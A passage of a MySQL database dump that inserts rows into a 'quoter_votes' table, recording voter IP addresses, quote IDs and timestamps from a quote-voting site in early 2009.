  (9976,'72.30.81.151','',0,163,1230933203),
  (9977,'66.231.188.53','',0,305,1230933396),
  (9978,'66.231.188.53','',0,297,1230934167),
  (9979,'91.122.147.106','',0,322,1230935331),
  (9980,'92.112.14.132','',0,324,1230935490),
  (9981,'64.1.215.165','',0,98,1230935882),
  (9982,'64.1.215.165','',0,38,1230936762),
  (9983,'79.111.42.180','',0,145,1230937347),
  (9984,'79.111.42.180','',0,286,1230937504),
  (9985,'79.111.42.180','',0,235,1230937622),
  (9986,'79.111.42.180','',0,213,1230937840),
  (9987,'93.185.182.24','',0,324,1230937905),
  (9988,'93.185.182.24','',0,322,1230938089),
  (9989,'77.52.248.49','',0,325,1230938511),
  (9990,'72.30.81.151','',0,4,1230939389),
  (9991,'72.30.81.151','',0,113,1230939883),
  (9992,'72.30.81.151','',0,85,1230940104),
  (9993,'72.30.81.151','',0,207,1230940429),
  (9994,'79.175.2.21','',0,325,1230940570),
  (9995,'79.175.2.21','',0,320,1230940668),
  (9996,'79.175.2.21','',0,305,1230940727),
  (9997,'72.30.81.151','',0,270,1230942740),
  (9998,'79.111.42.180','',0,322,1230942757),
  (9999,'79.111.42.180','',0,325,1230942789),
  (10000,'78.24.227.75','',0,1,1230943728);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 10000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (10001,'72.30.81.151','',0,263,1230944631),
  (10002,'72.30.81.151','',0,185,1230946749),
  (10003,'72.30.81.151','',0,279,1230947405),
  (10004,'78.37.119.93','',0,212,1230949990),
  (10005,'78.37.119.93','',0,299,1230949995),
  (10006,'78.37.119.93','',0,321,1230950073),
  (10007,'78.37.119.93','',0,324,1230950128),
  (10008,'78.37.119.93','',0,319,1230950186),
  (10009,'72.30.81.151','',0,320,1230950301),
  (10010,'72.30.81.151','',0,75,1230950419),
  (10011,'64.1.215.165','',0,134,1230950686),
  (10012,'72.30.81.151','',0,208,1230951635),
  (10013,'91.202.197.79','',0,319,1230956591),
  (10014,'64.1.215.165','',0,16,1230957570),
  (10015,'72.30.81.151','',0,208,1230961977),
  (10016,'92.46.242.198','',0,324,1230962698),
  (10017,'64.1.215.165','',0,245,1230962715),
  (10018,'72.30.81.151','',0,2,1230962936),
  (10019,'86.57.181.90','',0,299,1230962989),
  (10020,'121.44.217.227','',0,311,1230963653),
  (10021,'121.44.217.227','',0,255,1230963821),
  (10022,'72.30.81.151','',0,321,1230964613),
  (10023,'72.30.81.151','',0,325,1230966206),
  (10024,'72.30.81.151','',0,324,1230966400),
  (10025,'66.249.72.101','',0,100,1230966765),
  (10026,'78.37.119.93','',0,299,1230967004),
  (10027,'78.37.119.93','',0,212,1230967007),
  (10028,'66.249.72.101','',0,152,1230967248),
  (10029,'86.57.181.90','',0,298,1230967805),
  (10030,'72.30.81.151','',0,320,1230967847),
  (10031,'64.1.215.165','',0,114,1230968054),
  (10032,'66.249.72.101','',0,113,1230968577),
  (10033,'202.71.103.82','',0,299,1230969145),
  (10034,'72.30.81.151','',0,204,1230969431),
  (10035,'64.1.215.165','',0,44,1230969799),
  (10036,'80.89.145.65','',0,316,1230970312),
  (10037,'72.30.81.151','',0,256,1230970316),
  (10038,'66.249.72.101','',0,212,1230970705),
  (10039,'72.30.81.151','',0,23,1230971388),
  (10040,'66.249.72.101','',0,213,1230971490),
  (10041,'66.249.72.101','',0,248,1230971580),
  (10042,'72.30.81.151','',0,81,1230971838),
  (10043,'81.18.116.69','',0,319,1230972857),
  (10044,'64.1.215.165','',0,105,1230973007),
  (10045,'66.249.72.101','',0,247,1230973853),
  (10046,'81.25.38.201','',0,324,1230974006),
  (10047,'72.30.81.151','',0,322,1230975290),
  (10048,'66.249.72.101','',0,309,1230976223),
  (10049,'66.249.72.101','',0,254,1230976373),
  (10050,'64.1.215.165','',0,220,1230976470),
  (10051,'72.30.81.151','',0,60,1230978812),
  (10052,'66.249.72.101','',0,305,1230979761),
  (10053,'64.1.215.165','',0,110,1230980527),
  (10054,'66.249.72.101','',0,62,1230980556),
  (10055,'72.30.81.151','',0,324,1230980713),
  (10056,'66.249.72.101','',0,69,1230981640),
  (10057,'66.249.72.101','',0,20,1230983257),
  (10058,'64.1.215.165','',0,253,1230983543),
  (10059,'64.1.215.165','',0,157,1230983786),
  (10060,'64.1.215.165','',0,23,1230984534),
  (10061,'66.249.72.101','',0,304,1230984748),
  (10062,'64.1.215.165','',0,71,1230986971),
  (10063,'93.185.182.24','',0,326,1230987140),
  (10064,'66.249.72.101','',0,288,1230987385),
  (10065,'92.47.226.75','',0,1,1230988068),
  (10066,'92.47.226.75','',0,55,1230988070),
  (10067,'92.47.226.75','',0,258,1230988088),
  (10068,'66.249.72.101','',0,279,1230988326),
  (10069,'92.124.5.206','',0,287,1230990709),
  (10070,'66.249.72.101','',0,297,1230991039),
  (10071,'66.249.72.101','',0,291,1230991186),
  (10072,'217.66.16.83','',0,288,1230992528),
  (10073,'72.30.81.151','',0,204,1230992654),
  (10074,'64.1.215.165','',0,145,1230993149),
  (10075,'81.25.38.201','',0,326,1230993520),
  (10076,'72.30.81.151','',0,212,1230993565),
  (10077,'66.249.72.101','',0,287,1230993885),
  (10078,'79.171.124.210','',0,325,1230995691),
  (10079,'81.18.116.69','',0,327,1230996943),
  (10080,'78.37.121.227','',0,299,1230997382),
  (10081,'78.37.121.227','',0,212,1230997468),
  (10082,'66.249.72.101','',0,288,1230998322),
  (10083,'85.140.119.20','',0,326,1230998583),
  (10084,'85.140.119.20','',0,327,1230998610),
  (10085,'72.30.81.151','',0,23,1230999501),
  (10086,'93.90.245.174','',0,322,1230999853),
  (10087,'91.202.197.79','',0,327,1230999858),
  (10088,'91.202.197.79','',0,326,1230999866),
  (10089,'64.1.215.165','',0,61,1231000014),
  (10090,'93.90.245.174','',0,317,1231000072),
  (10091,'93.90.245.174','',0,311,1231000145),
  (10092,'93.90.245.174','',0,212,1231000349),
  (10093,'93.90.245.174','',0,29,1231000462),
  (10094,'93.90.245.174','',0,56,1231000474),
  (10095,'93.90.245.174','',0,173,1231000495),
  (10096,'72.30.81.151','',0,80,1231000732),
  (10097,'217.118.64.42','',0,325,1231001237),
  (10098,'64.1.215.165','',0,216,1231001653),
  (10099,'67.195.37.171','',0,319,1231002905),
  (10100,'66.249.72.101','',0,291,1231004147),
  (10101,'66.249.72.101','',0,274,1231004361),
  (10102,'89.178.124.117','',0,298,1231005024),
  (10103,'89.178.124.117','',0,255,1231005091),
  (10104,'64.1.215.165','',0,73,1231005157),
  (10105,'66.249.72.101','',0,270,1231006858),
  (10106,'217.150.60.29','',0,173,1231008370),
  (10107,'64.1.215.165','',0,255,1231009277),
  (10108,'66.249.72.101','',0,6,1231010921),
  (10109,'64.1.215.165','',0,58,1231012176),
  (10110,'72.30.81.151','',0,218,1231012226),
  (10111,'72.30.81.151','',0,214,1231013536),
  (10112,'77.120.129.166','',0,324,1231013541),
  (10113,'78.37.121.227','',0,212,1231013806),
  (10114,'77.52.86.251','',0,212,1231013887),
  (10115,'64.1.215.165','',0,96,1231013904),
  (10116,'77.52.86.251','',0,120,1231014204),
  (10117,'195.248.161.168','',0,327,1231015847),
  (10118,'195.248.161.168','',0,326,1231015849),
  (10119,'195.248.161.168','',0,324,1231015857),
  (10120,'72.30.81.151','',0,143,1231016605),
  (10121,'64.1.215.165','',0,283,1231018631),
  (10122,'72.30.81.151','',0,152,1231018679),
  (10123,'64.1.215.165','',0,124,1231018888),
  (10124,'72.30.81.151','',0,3,1231021307),
  (10125,'77.88.30.246','',0,325,1231024629),
  (10126,'77.88.30.246','',0,324,1231024659),
  (10127,'77.88.30.246','',0,322,1231024672),
  (10128,'72.30.81.151','',0,250,1231027833),
  (10129,'64.1.215.165','',0,74,1231030306),
  (10130,'64.1.215.165','',0,247,1231031558),
  (10131,'92.112.9.101','',0,54,1231032326),
  (10132,'64.1.215.165','',0,135,1231032352),
  (10133,'92.112.9.101','',0,299,1231032424),
  (10134,'72.30.81.151','',0,29,1231034091),
  (10135,'91.202.197.79','',0,327,1231034523),
  (10136,'91.202.197.79','',0,325,1231034536),
  (10137,'91.202.197.79','',0,319,1231034552),
  (10138,'91.202.197.79','',0,299,1231034631),
  (10139,'91.202.197.79','',0,305,1231034634),
  (10140,'91.202.197.79','',0,312,1231034644),
  (10141,'74.208.16.168','',0,324,1231034673),
  (10142,'72.30.81.151','',0,3,1231034734),
  (10143,'78.37.121.227','',0,212,1231035077),
  (10144,'72.30.81.151','',0,322,1231035574),
  (10145,'72.30.81.151','',0,205,1231035715),
  (10146,'92.49.154.148','',0,318,1231035781),
  (10147,'72.30.81.151','',0,289,1231035982),
  (10148,'72.30.81.151','',0,286,1231035997),
  (10149,'72.30.81.151','',0,288,1231036080),
  (10150,'72.30.81.151','',0,292,1231036131),
  (10151,'72.30.81.151','',0,287,1231036157),
  (10152,'72.30.81.151','',0,296,1231036199),
  (10153,'89.107.82.88','',0,1,1231036204),
  (10154,'89.107.82.88','',0,55,1231036212),
  (10155,'64.1.215.165','',0,290,1231036249),
  (10156,'72.30.81.151','',0,290,1231036257),
  (10157,'72.30.81.151','',0,291,1231036325),
  (10158,'64.1.215.165','',0,145,1231039598),
  (10159,'86.57.221.198','',0,299,1231043706),
  (10160,'95.56.4.192','',0,1,1231043747),
  (10161,'95.56.4.192','',0,55,1231043750),
  (10162,'95.56.4.192','',0,258,1231043783),
  (10163,'74.6.22.182','',0,258,1231044439),
  (10164,'67.195.37.171','',0,322,1231045671),
  (10165,'67.195.37.171','',0,318,1231045703),
  (10166,'67.195.37.171','',0,320,1231045743),
  (10167,'67.195.37.171','',0,325,1231045764),
  (10168,'67.195.37.171','',0,317,1231045773),
  (10169,'67.195.37.171','',0,324,1231045814),
  (10170,'67.195.37.171','',0,326,1231045845),
  (10171,'92.47.224.92','',0,1,1231046095),
  (10172,'92.47.224.92','',0,55,1231046098),
  (10173,'92.47.224.92','',0,212,1231046104),
  (10174,'92.47.224.92','',0,258,1231046131),
  (10175,'67.195.37.171','',0,316,1231047152),
  (10176,'67.195.37.171','',0,327,1231047877),
  (10177,'72.30.81.151','',0,292,1231048142),
  (10178,'67.195.37.171','',0,319,1231048367),
  (10179,'64.1.215.165','',0,106,1231048835),
  (10180,'64.1.215.165','',0,113,1231049438),
  (10181,'66.249.72.101','',0,253,1231052370),
  (10182,'72.30.81.151','',0,327,1231052808),
  (10183,'72.30.81.151','',0,8,1231052870),
  (10184,'72.30.81.151','',0,326,1231052902),
  (10185,'66.249.72.101','',0,6,1231054885),
  (10186,'81.18.116.69','',0,324,1231054987),
  (10187,'81.18.116.69','',0,322,1231054990),
  (10188,'81.18.116.69','',0,327,1231055054),
  (10189,'72.30.81.151','',0,136,1231055134),
  (10190,'66.249.72.101','',0,50,1231055217),
  (10191,'66.249.72.101','',0,14,1231056114),
  (10192,'89.105.150.193','',0,247,1231056141),
  (10193,'72.30.81.151','',0,296,1231056868),
  (10194,'89.105.150.193','',0,145,1231057151),
  (10195,'89.105.150.193','',0,16,1231057392),
  (10196,'89.105.150.193','',0,318,1231057467),
  (10197,'89.105.150.193','',0,62,1231057566),
  (10198,'89.105.150.193','',0,99,1231057719),
  (10199,'89.105.150.193','',0,125,1231057774),
  (10200,'94.51.14.48','',0,325,1231058015),
  (10201,'94.51.14.48','',0,324,1231058095),
  (10202,'94.51.14.48','',0,320,1231058206),
  (10203,'94.51.14.48','',0,318,1231058244),
  (10204,'81.18.116.69','',0,325,1231058358),
  (10205,'64.1.215.165','',0,235,1231058578),
  (10206,'95.58.225.8','',0,185,1231059136),
  (10207,'89.105.150.193','',0,152,1231059532),
  (10208,'89.105.150.193','',0,245,1231059563),
  (10209,'89.105.150.193','',0,312,1231059632),
  (10210,'78.24.226.84','',0,1,1231059668),
  (10211,'78.24.226.84','',0,55,1231059674),
  (10212,'72.30.81.151','',0,29,1231063174),
  (10213,'72.30.81.151','',0,1,1231063412),
  (10214,'193.110.113.78','',0,327,1231064072),
  (10215,'66.249.72.101','',0,99,1231064316),
  (10216,'83.149.41.16','',0,328,1231064404),
  (10217,'193.110.113.78','',0,299,1231065027),
  (10218,'77.35.36.29','',0,287,1231065062),
  (10219,'83.149.41.16','',0,325,1231065091),
  (10220,'72.30.81.151','',0,283,1231065527),
  (10221,'66.249.72.101','',0,125,1231066376),
  (10222,'86.57.222.54','',0,299,1231067079),
  (10223,'66.249.72.101','',0,253,1231067265),
  (10224,'78.37.127.151','',0,299,1231068636),
  (10225,'78.37.127.151','',0,212,1231068637),
  (10226,'66.249.72.101','',0,247,1231069314),
  (10227,'87.224.244.95','',0,178,1231069690),
  (10228,'87.224.244.95','',0,106,1231069775),
  (10229,'64.1.215.165','',0,303,1231070031),
  (10230,'87.224.244.95','',0,173,1231070293),
  (10231,'64.1.215.165','',0,240,1231071421),
  (10232,'156.17.237.13','',0,327,1231072337),
  (10233,'66.249.72.101','',0,2,1231073658),
  (10234,'64.1.215.165','',0,111,1231074127),
  (10235,'64.1.215.165','',0,185,1231074412),
  (10236,'94.178.134.89','',0,320,1231075657),
  (10237,'93.185.182.24','',0,329,1231078203),
  (10238,'92.113.246.250','',0,329,1231079188),
  (10239,'66.249.72.101','',0,55,1231080420),
  (10240,'64.1.215.165','',0,90,1231080812),
  (10241,'66.249.72.101','',0,234,1231080888),
  (10242,'85.141.164.109','',0,329,1231081415),
  (10243,'85.141.164.109','',0,328,1231081470),
  (10244,'72.30.81.151','',0,249,1231081646),
  (10245,'94.248.20.176','',0,328,1231081981),
  (10246,'94.248.20.176','',0,221,1231082184),
  (10247,'94.248.20.176','',0,287,1231082571),
  (10248,'64.1.215.165','',0,214,1231082848),
  (10249,'72.30.81.151','',0,76,1231083042),
  (10250,'64.1.215.165','',0,190,1231083156),
  (10251,'86.57.222.54','',0,299,1231084782),
  (10252,'72.30.81.151','',0,215,1231084941),
  (10253,'72.30.81.151','',0,134,1231086572),
  (10254,'66.249.72.101','',0,2,1231087094),
  (10255,'72.30.81.151','',0,286,1231087940),
  (10256,'66.249.72.101','',0,4,1231087995),
  (10257,'66.249.72.101','',0,328,1231089096),
  (10258,'66.249.72.101','',0,234,1231089295),
  (10259,'64.1.215.165','',0,94,1231090083),
  (10260,'64.1.215.165','',0,125,1231090756),
  (10261,'66.249.72.101','',0,1,1231091024),
  (10262,'72.30.81.151','',0,139,1231091033),
  (10263,'72.30.81.151','',0,203,1231091052),
  (10264,'64.1.215.165','',0,242,1231094225),
  (10265,'72.30.81.151','',0,195,1231094751),
  (10266,'64.1.215.165','',0,118,1231094823),
  (10267,'64.1.215.165','',0,305,1231095598),
  (10268,'213.85.81.90','',0,328,1231096482),
  (10269,'213.85.81.90','',0,329,1231096549),
  (10270,'64.1.215.165','',0,110,1231096713),
  (10271,'78.37.127.151','',0,212,1231098959),
  (10272,'62.221.87.13','',0,322,1231098962),
  (10273,'64.1.215.165','',0,104,1231101127),
  (10274,'88.204.16.169','',0,322,1231101409),
  (10275,'87.228.54.224','',0,328,1231102548),
  (10276,'87.228.54.224','',0,327,1231102713),
  (10277,'87.228.54.224','',0,326,1231102737),
  (10278,'87.228.54.224','',0,317,1231103176),
  (10279,'87.228.54.224','',0,309,1231103411),
  (10280,'87.228.54.224','',0,305,1231103446),
  (10281,'87.228.54.224','',0,304,1231103460),
  (10282,'66.249.72.101','',0,4,1231103567),
  (10283,'87.228.54.224','',0,297,1231103585),
  (10284,'87.228.54.224','',0,291,1231103627),
  (10285,'72.30.81.151','',0,84,1231104014),
  (10286,'87.228.54.224','',0,288,1231104107),
  (10287,'87.228.54.224','',0,287,1231104135),
  (10288,'87.228.54.224','',0,279,1231104168),
  (10289,'87.228.54.224','',0,274,1231104179),
  (10290,'87.228.54.224','',0,270,1231104198),
  (10291,'72.30.81.151','',0,113,1231104208),
  (10292,'87.228.54.224','',0,262,1231104286),
  (10293,'87.228.54.224','',0,259,1231104293),
  (10294,'87.228.54.224','',0,242,1231104647),
  (10295,'87.228.54.224','',0,238,1231104670),
  (10296,'87.228.54.224','',0,233,1231104685),
  (10297,'87.228.54.224','',0,222,1231104709),
  (10298,'87.228.54.224','',0,218,1231104718),
  (10299,'87.228.54.224','',0,208,1231104732),
  (10300,'87.228.54.224','',0,206,1231104842),
  (10301,'87.228.54.224','',0,204,1231104848),
  (10302,'87.228.54.224','',0,212,1231105038),
  (10303,'87.228.54.224','',0,29,1231105091),
  (10304,'87.228.54.224','',0,56,1231105104),
  (10305,'87.228.54.224','',0,21,1231105129),
  (10306,'87.228.54.224','',0,173,1231105180),
  (10307,'87.228.54.224','',0,18,1231105203),
  (10308,'77.122.32.72','',0,147,1231105524),
  (10309,'66.249.72.101','',0,55,1231106208),
  (10310,'64.1.215.165','',0,309,1231106232),
  (10311,'79.171.124.210','',0,329,1231106575),
  (10312,'66.249.72.101','',0,58,1231106898),
  (10313,'64.1.215.165','',0,157,1231107269),
  (10314,'64.1.215.165','',0,95,1231107561),
  (10315,'156.17.237.13','',0,330,1231107611),
  (10316,'156.17.237.13','',0,329,1231107612),
  (10317,'156.17.237.13','',0,299,1231107851),
  (10318,'72.30.81.151','',0,249,1231107867),
  (10319,'72.30.81.151','',0,70,1231109218),
  (10320,'72.30.81.151','',0,184,1231109250),
  (10321,'91.122.25.76','',0,274,1231111107),
  (10322,'78.37.127.151','',0,212,1231111111),
  (10323,'78.37.127.151','',0,299,1231111117),
  (10324,'72.30.81.151','',0,147,1231113573),
  (10325,'64.1.215.165','',0,108,1231114524),
  (10326,'80.243.71.189','',0,328,1231116457),
  (10327,'72.30.81.151','',0,288,1231117437),
  (10328,'66.249.72.101','',0,58,1231117439),
  (10329,'83.219.154.117','',0,212,1231117495),
  (10330,'83.219.154.117','',0,213,1231117505),
  (10331,'83.219.154.117','',0,119,1231117635),
  (10332,'64.1.215.165','',0,95,1231118659),
  (10333,'72.30.81.151','',0,283,1231118891),
  (10334,'72.30.81.151','',0,23,1231119005),
  (10335,'72.30.81.151','',0,248,1231119644),
  (10336,'72.30.81.151','',0,250,1231120172),
  (10337,'64.1.215.165','',0,133,1231120904),
  (10338,'91.124.6.189','',0,330,1231121228),
  (10339,'72.30.81.151','',0,215,1231121735),
  (10340,'72.30.81.151','',0,223,1231121772),
  (10341,'72.30.81.151','',0,247,1231123267),
  (10342,'64.1.215.165','',0,249,1231123869),
  (10343,'64.1.215.165','',0,115,1231124324),
  (10344,'72.30.81.151','',0,12,1231124569),
  (10345,'72.30.81.151','',0,298,1231126933),
  (10346,'72.30.81.151','',0,135,1231131578),
  (10347,'202.87.9.194','',0,255,1231134991),
  (10348,'93.185.182.24','',0,330,1231135536),
  (10349,'72.30.81.151','',0,264,1231135973),
  (10350,'80.243.71.189','',0,30,1231136602),
  (10351,'79.171.124.210','',0,331,1231136673),
  (10352,'79.171.124.210','',0,329,1231137866),
  (10353,'72.30.81.151','',0,329,1231139406),
  (10354,'72.30.81.151','',0,331,1231139563),
  (10355,'87.252.227.45','',0,330,1231139581),
  (10356,'72.30.81.151','',0,330,1231139649),
  (10357,'72.30.81.151','',0,4,1231140922),
  (10358,'193.232.92.242','',0,318,1231140975),
  (10359,'193.232.92.242','',0,317,1231140985),
  (10360,'81.18.116.69','',0,330,1231142132),
  (10361,'81.18.116.69','',0,329,1231142143),
  (10362,'81.18.116.69','',0,328,1231142195),
  (10363,'81.18.116.69','',0,322,1231142270),
  (10364,'81.18.116.69','',0,327,1231142275),
  (10365,'81.18.116.69','',0,325,1231142350),
  (10366,'81.18.116.69','',0,320,1231142355),
  (10367,'72.30.81.151','',0,328,1231142721),
  (10368,'195.189.142.48','',0,329,1231142729),
  (10369,'212.98.164.146','',0,327,1231143322),
  (10370,'212.98.164.146','',0,322,1231143364),
  (10371,'91.210.20.2','',0,291,1231145218),
  (10372,'72.30.81.151','',0,236,1231146051),
  (10373,'72.30.81.151','',0,9,1231146508),
  (10374,'72.30.81.151','',0,58,1231146945),
  (10375,'95.24.43.250','',0,331,1231149597),
  (10376,'89.223.24.167','',0,332,1231149819),
  (10377,'89.223.24.167','',0,328,1231149980),
  (10378,'193.93.218.67','',0,332,1231150572),
  (10379,'66.249.72.101','',0,265,1231150725),
  (10380,'66.249.72.101','',0,262,1231150735),
  (10381,'72.30.81.151','',0,238,1231151296),
  (10382,'66.249.72.101','',0,250,1231152475),
  (10383,'193.232.92.242','',0,329,1231152630),
  (10384,'193.232.92.242','',0,330,1231152631),
  (10385,'193.232.92.242','',0,331,1231152644),
  (10386,'92.255.212.42','',0,270,1231153182),
  (10387,'92.255.212.42','',0,262,1231153204),
  (10388,'77.122.141.130','',0,329,1231153221),
  (10389,'77.122.141.130','',0,330,1231153225),
  (10390,'92.255.212.42','',0,254,1231153228),
  (10391,'66.249.72.101','',0,263,1231153437),
  (10392,'72.30.81.151','',0,298,1231153701),
  (10393,'195.69.221.234','',0,332,1231154337),
  (10394,'66.249.72.101','',0,249,1231154459),
  (10395,'217.113.122.50','',0,330,1231155944),
  (10396,'85.142.2.30','',0,325,1231156717),
  (10397,'92.47.248.17','',0,55,1231156735),
  (10398,'92.47.248.17','',0,1,1231156737),
  (10399,'92.47.248.17','',0,258,1231156755),
  (10400,'66.249.72.101','',0,223,1231157178),
  (10401,'72.30.81.151','',0,110,1231158128),
  (10402,'72.30.81.151','',0,328,1231158481),
  (10403,'213.184.241.51','',0,330,1231158546),
  (10404,'78.37.122.248','',0,212,1231158784),
  (10405,'83.149.40.47','',0,330,1231158885),
  (10406,'83.149.40.47','',0,322,1231158941),
  (10407,'72.30.81.151','',0,60,1231160052),
  (10408,'92.113.169.128','',0,330,1231162172),
  (10409,'92.113.169.128','',0,329,1231162182),
  (10410,'94.179.84.35','',0,328,1231163884),
  (10411,'94.179.84.35','',0,326,1231163920),
  (10412,'94.179.84.35','',0,324,1231163972),
  (10413,'212.56.211.250','',0,305,1231164043),
  (10414,'94.179.84.35','',0,305,1231164080),
  (10415,'212.56.211.250','',0,262,1231164198),
  (10416,'212.56.211.250','',0,259,1231164262),
  (10417,'92.113.56.80','',0,287,1231164267),
  (10418,'92.36.92.128','',0,332,1231166329),
  (10419,'91.124.26.214','',0,333,1231167028),
  (10420,'91.124.26.214','',0,329,1231167147),
  (10421,'91.124.26.214','',0,330,1231167149),
  (10422,'72.30.81.151','',0,214,1231167208),
  (10423,'91.124.26.214','',0,291,1231167212),
  (10424,'194.44.190.7','',0,120,1231167334),
  (10425,'91.124.26.214','',0,287,1231167385),
  (10426,'84.242.216.248','',0,331,1231169646),
  (10427,'84.242.216.248','',0,330,1231169651),
  (10428,'66.249.72.101','',0,332,1231169976),
  (10429,'212.98.183.3','',0,324,1231172128),
  (10430,'212.98.183.3','',0,322,1231172143),
  (10431,'66.249.72.101','',0,38,1231173745),
  (10432,'91.122.16.128','',0,212,1231176692),
  (10433,'91.122.16.128','',0,299,1231176694),
  (10434,'89.113.75.72','',0,272,1231178776),
  (10435,'66.249.72.101','',0,332,1231178872),
  (10436,'72.30.81.151','',0,133,1231179105),
  (10437,'72.30.81.151','',0,236,1231183686),
  (10438,'72.30.81.151','',0,297,1231186002),
  (10439,'72.30.81.151','',0,247,1231187678),
  (10440,'79.171.124.122','',0,330,1231188229),
  (10441,'95.83.163.232','',0,255,1231188515),
  (10442,'95.83.163.232','',0,322,1231188576),
  (10443,'75.19.35.49','',0,265,1231188616),
  (10444,'95.83.163.232','',0,310,1231188692),
  (10445,'95.83.163.232','',0,283,1231188765),
  (10446,'95.83.163.232','',0,249,1231188869),
  (10447,'72.30.81.151','',0,50,1231189978),
  (10448,'72.30.81.151','',0,143,1231191023),
  (10449,'72.30.81.151','',0,235,1231193078),
  (10450,'91.210.20.2','',0,333,1231193413),
  (10451,'89.113.75.72','',0,333,1231193638),
  (10452,'89.113.75.72','',0,332,1231193650),
  (10453,'89.113.75.72','',0,330,1231193674),
  (10454,'89.113.75.72','',0,328,1231193717),
  (10455,'89.113.75.72','',0,327,1231193963),
  (10456,'72.30.81.151','',0,299,1231194040),
  (10457,'85.140.65.103','',0,332,1231194173),
  (10458,'85.140.65.103','',0,331,1231194195),
  (10459,'85.140.65.103','',0,330,1231194219),
  (10460,'85.140.65.103','',0,328,1231194226),
  (10461,'89.113.75.72','',0,316,1231194357),
  (10462,'72.30.81.151','',0,238,1231194366),
  (10463,'89.113.75.72','',0,315,1231194374),
  (10464,'72.30.81.151','',0,135,1231197281),
  (10465,'217.197.1.223','',0,331,1231199027),
  (10466,'217.197.1.223','',0,328,1231199048),
  (10467,'217.197.1.223','',0,330,1231199049),
  (10468,'66.249.72.101','',0,61,1231199060),
  (10469,'72.30.81.151','',0,299,1231201490),
  (10470,'213.149.5.247','',0,56,1231202757),
  (10471,'89.107.82.37','',0,1,1231203315),
  (10472,'89.107.82.37','',0,55,1231203319),
  (10473,'66.249.72.101','',0,60,1231205163),
  (10474,'66.249.72.101','',0,56,1231205549),
  (10475,'72.30.81.151','',0,245,1231206469),
  (10476,'66.249.72.101','',0,25,1231206710),
  (10477,'66.249.72.101','',0,29,1231206853),
  (10478,'72.30.81.151','',0,199,1231208929),
  (10479,'64.1.215.165','',0,291,1231209026),
  (10480,'64.1.215.165','',0,30,1231209132),
  (10481,'66.249.72.101','',0,21,1231209712),
  (10482,'64.1.215.165','',0,63,1231210030),
  (10483,'64.1.215.165','',0,159,1231210773),
  (10484,'66.249.66.47','',0,9,1231211640),
  (10485,'72.30.81.151','',0,243,1231211776),
  (10486,'64.1.215.165','',0,103,1231212846),
  (10487,'66.249.66.47','',0,29,1231213039),
  (10488,'64.1.215.165','',0,18,1231213653),
  (10489,'80.243.71.189','',0,299,1231214918),
  (10490,'80.243.71.189','',0,212,1231214922),
  (10491,'66.249.66.47','',0,38,1231215085),
  (10492,'66.249.66.47','',0,322,1231215557),
  (10493,'66.249.66.47','',0,25,1231215618),
  (10494,'64.1.215.165','',0,93,1231216481),
  (10495,'174.36.207.234','',0,333,1231217380),
  (10496,'174.36.207.234','',0,332,1231217386),
  (10497,'174.36.207.234','',0,331,1231217391),
  (10498,'174.36.207.234','',0,328,1231217397),
  (10499,'174.36.207.234','',0,327,1231217408),
  (10500,'174.36.207.234','',0,326,1231217414);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 10500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (10501,'174.36.207.234','',0,325,1231217419),
  (10502,'174.36.207.234','',0,324,1231217425),
  (10503,'174.36.207.234','',0,322,1231217434),
  (10504,'174.36.207.234','',0,320,1231217445),
  (10505,'174.36.207.234','',0,309,1231217509),
  (10506,'174.36.207.234','',0,305,1231217516),
  (10507,'174.36.207.234','',0,304,1231217545),
  (10508,'174.36.207.234','',0,297,1231217557),
  (10509,'174.36.207.234','',0,311,1231217593),
  (10510,'174.36.207.234','',0,310,1231217599),
  (10511,'174.36.207.234','',0,299,1231217605),
  (10512,'174.36.207.234','',0,298,1231217612),
  (10513,'174.36.207.234','',0,296,1231217626),
  (10514,'174.36.207.234','',0,292,1231217632),
  (10515,'174.36.207.234','',0,255,1231217638),
  (10516,'174.36.207.234','',0,251,1231217646),
  (10517,'174.36.207.234','',0,241,1231217659),
  (10518,'174.36.207.234','',0,240,1231217665),
  (10519,'174.36.207.234','',0,286,1231217679),
  (10520,'174.36.207.234','',0,248,1231217688),
  (10521,'174.36.207.234','',0,247,1231217696),
  (10522,'174.36.207.234','',0,235,1231217709),
  (10523,'174.36.207.234','',0,227,1231217717),
  (10524,'174.36.207.234','',0,216,1231217724),
  (10525,'174.36.207.234','',0,215,1231217729),
  (10526,'174.36.207.234','',0,213,1231217736),
  (10527,'174.36.207.234','',0,303,1231217750),
  (10528,'174.36.207.234','',0,290,1231217756),
  (10529,'174.36.207.234','',0,283,1231217765),
  (10530,'174.36.207.234','',0,249,1231217772),
  (10531,'174.36.207.234','',0,231,1231217778),
  (10532,'174.36.207.234','',0,230,1231217784),
  (10533,'174.36.207.234','',0,220,1231217791),
  (10534,'174.36.207.234','',0,207,1231217796),
  (10535,'174.36.207.234','',0,205,1231217805),
  (10536,'174.36.207.234','',0,184,1231217811),
  (10537,'174.36.207.234','',0,258,1231217828),
  (10538,'174.36.207.234','',0,246,1231217832),
  (10539,'174.36.207.234','',0,163,1231217843),
  (10540,'174.36.207.234','',0,143,1231217850),
  (10541,'174.36.207.234','',0,139,1231217856),
  (10542,'174.36.207.234','',0,133,1231217861),
  (10543,'174.36.207.234','',0,111,1231217866),
  (10544,'174.36.207.234','',0,89,1231217874),
  (10545,'174.36.207.234','',0,77,1231217880),
  (10546,'174.36.207.234','',0,70,1231217888),
  (10547,'174.36.207.234','',0,318,1231217903),
  (10548,'174.36.207.234','',0,317,1231217907),
  (10549,'174.36.207.234','',0,316,1231217913),
  (10550,'174.36.207.234','',0,312,1231217919),
  (10551,'174.36.207.234','',0,245,1231217929),
  (10552,'174.36.207.234','',0,152,1231217938),
  (10553,'174.36.207.234','',0,125,1231217946),
  (10554,'174.36.207.234','',0,99,1231217952),
  (10555,'174.36.207.234','',0,62,1231217960),
  (10556,'174.36.207.234','',0,272,1231217970),
  (10557,'174.36.207.234','',0,256,1231217976),
  (10558,'174.36.207.234','',0,243,1231217983),
  (10559,'174.36.207.234','',0,234,1231217990),
  (10560,'174.36.207.234','',0,229,1231218007),
  (10561,'174.36.207.234','',0,203,1231218014),
  (10562,'174.36.207.234','',0,147,1231218027),
  (10563,'174.36.207.234','',0,113,1231218035),
  (10564,'174.36.207.234','',0,88,1231218042),
  (10565,'174.36.207.234','',0,87,1231218049),
  (10566,'174.36.207.234','',0,313,1231218065),
  (10567,'66.249.66.47','',0,12,1231218066),
